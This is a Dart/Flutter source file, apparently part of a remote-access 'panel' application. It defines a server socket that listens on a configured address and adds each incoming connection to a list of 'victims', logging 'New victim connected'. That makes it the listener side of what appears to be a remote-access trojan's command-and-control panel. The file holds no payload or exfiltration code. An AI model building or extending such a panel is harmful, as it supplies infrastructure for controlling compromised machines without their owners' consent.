import 'dart:async';
import 'dart:developer';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:panel/core/cache/locale_manager.dart';
import 'package:panel/product/enums/locale_enums.dart';
import 'package:panel/product/models/victim_model.dart';

class MainSocket extends ChangeNotifier {
  MainSocket();

  ServerSocket? serverSocket;
  StreamSubscription<Socket>? serverSocketSubscription;
  List<VictimModel> victims = List.empty(growable: true);

  Future init() async {
    serverSocket = await ServerSocket.bind(
        LocaleManager.instance.getString(LocaleEnum.defaultSocketIp),
        LocaleManager.instance.getInt(LocaleEnum.defaultSocketPort)!);
    serverSocketSubscription = serverSocket!.listen((event) {
      victims.add(VictimModel(event, notifyListeners));
      log("New victim connected");
      notifyListeners();
    });
    notifyListeners();
  }
}

ChangeNotifierProvider<MainSocket> serverSocketProvider =
    ChangeNotifierProvider((ref) => MainSocket());
